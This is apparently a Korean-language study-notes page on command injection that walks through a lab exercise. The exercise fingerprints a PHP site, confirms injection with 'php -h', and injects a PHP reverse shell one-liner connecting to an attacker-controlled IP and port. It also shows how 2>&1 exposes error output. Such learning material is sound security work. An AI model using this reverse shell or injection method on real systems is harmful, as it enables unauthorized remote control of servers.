---
title: Command Injection
parent: HTTP
nav_order: 2
---

# Command Injection
<br>
웹 서버/애플리케이션에서 공격자가 입력 필드나 파라미터를 통해 악의적인 명령어를 삽입하여 실행하는<br>공격 기법<br>
주로 애플리케이션이 사용자 입력을 적절히 검증하지 않을 때 발생한다.

> 명령어는 대부분 대상 호스트의 쉘 프로세스에서 실행
> - 대상 호스트에 명령어/인터프리터 정보 수집 후 실행
>

## 실습
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/1_정보수집.png' | relative_url }}" style="width:300px;">
    <figcaption>wappalyzer</figcaption>
</figure>

공격 대상의 웹 페이지로 가서 Wappalyzer로 확인해 본 결과 php 코드로 이루어져 있다는 것을 알았다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/2_커맨드인젝션.png' | relative_url }}" style="width:500px;">
    <figcaption>command injection</figcaption>
</figure>

php가 존재하는지 확실히 알기 위해 php -h라는 명령어를 삽입해 도움말 결과가 출력되는지 확인한다.
Ctrl+U 로 url 인코딩도 해주었다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/3_php결과.png' | relative_url }}" style="width:400px;">
    <figcaption>command injection 결과</figcaption>
</figure>

php -h 결과가 잘 출력되는 것을 볼 수 있다.
<br><br>

### 리버스 쉘 주입
<br>
command injection 취약점이 존재한다는 것과 php가 존재한다는 것을 확인했으니 **revshells.com** 에서 php로 짜여진 reverse shell 코드를 주입한 다음 url 인코딩을 수행한다.
<br><br>

``` php -r '$sock=fsockopen("<공격자의 IP주소>",<공격자의 포트번호>);shell_exec("sh <&3 >&3 2>&3");' ```

해당 코드는 대상 시스템에서 공격자의 소켓에 TCP 연결을 하고 쉘 입출력 전체를 열린 소켓으로 리다이렉션을 하는 것이다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/4_리버스쉘인젝션.png' | relative_url }}" style="width:500px;">
    <figcaption>리버스 쉘 코드 주입</figcaption>
</figure>

실행하기 전에 공격자의 시스템에서 1234번 포트를 열어둬야 한다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/5_성공.png' | relative_url }}" style="width:500px;">
    <figcaption>연결 성공</figcaption>
</figure>

---
---
만약 command injection을 했는데 아무 결과도 안나왔다면 에러 메시지로 나왔을 확률이 높다는 것을 알아두면 좋다.
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/6_에러.png' | relative_url }}" style="width:600px;">
    <figcaption>▲ python3 -h를 주입하자 어떤 결과도 출력하지 않는 모습</figcaption>
</figure>
<br>

그럴 경우 2>&1 구문을 통해 표준 에러를 표준 출력으로 리다이렉션, 즉 에러메시지도 출력하게 만든다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/http/command_injection/7_에러출력.png' | relative_url }}" style="width:600px;">
    <figcaption>▲ 2>&1 구문에 의해 오류 메시지가 출력되는 모습</figcaption>
</figure>
<br>

